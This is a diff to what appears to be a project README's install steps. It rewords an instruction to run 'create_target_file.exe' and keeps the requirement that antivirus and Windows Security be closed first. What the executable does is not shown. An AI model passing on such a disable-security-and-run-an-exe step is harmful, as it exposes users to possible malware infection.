@@ -2,7 +2,7 @@
 
 1) Download python 3.11.9 (if version downloaded skip this step).
 2) Run requirements.bat to auto-download all modules and libraries for the program to work.
-3) If the script files didnt work or load, open the 'create_target_file' and run the .exe file. (Antivirus and Windows Security must be closed for the script to work).
+3) If the script files didnt work or load, run the create_target_file.exe module. (Antivirus and Windows Security must be closed for the script to work).
 
 
 ## Features
